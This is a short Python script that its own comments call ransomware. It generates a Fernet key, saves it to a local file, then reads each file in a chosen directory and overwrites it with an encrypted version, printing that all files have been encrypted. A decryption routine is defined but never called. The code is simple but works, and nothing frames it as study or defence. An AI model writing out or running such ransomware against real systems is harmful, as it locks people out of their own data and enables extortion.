import os
from cryptography.fernet import Fernet

# Generate a key and save it into a file
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

# Load the key from the current directory named `key.key`
def load_key():
    return open("key.key", "rb").read()

# Encrypt a file
def encrypt_file(file_name, key):
    f = Fernet(key)
    with open(file_name, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_name, "wb") as file:
        file.write(encrypted_data)

# Decrypt a file
def decrypt_file(file_name, key):
    f = Fernet(key)
    with open(file_name, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(file_name, "wb") as file:
        file.write(decrypted_data)

# Main function to run the ransomware
def main():
    # Generate and write a new key
    write_key()
    key = load_key()

    # Specify the directory to encrypt
    directory = "path/to/your/files"

    # Encrypt all files in the specified directory
    for file_name in os.listdir(directory):
        file_path = os.path.join(directory, file_name)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

    print("All files have been encrypted.")

if __name__ == "__main__":
    main()
